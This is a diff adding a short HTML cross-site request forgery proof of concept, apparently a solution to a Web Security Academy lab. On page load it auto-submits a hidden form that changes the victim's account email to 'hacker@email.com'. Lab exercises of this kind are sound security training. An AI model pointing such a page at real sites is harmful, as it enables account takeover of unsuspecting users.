@@ -1,0 +1,12 @@
+<html>
+<body>
+	<iframe name = "csrf-iframe" style = "display:none"></iframe>
+	<form method = "post" id = "csrf-form" action = "https://0a4000870496f2c085c3a36a000800c9.web-security-academy.net/my-account/change-email" target = "csrf-iframe">
+		<input type = "hidden" name = "email" value = "hacker@email.com">
+	</form>
+
+	<script>
+		document.forms[0].submit();
+	</script>
+</body>
+</html>
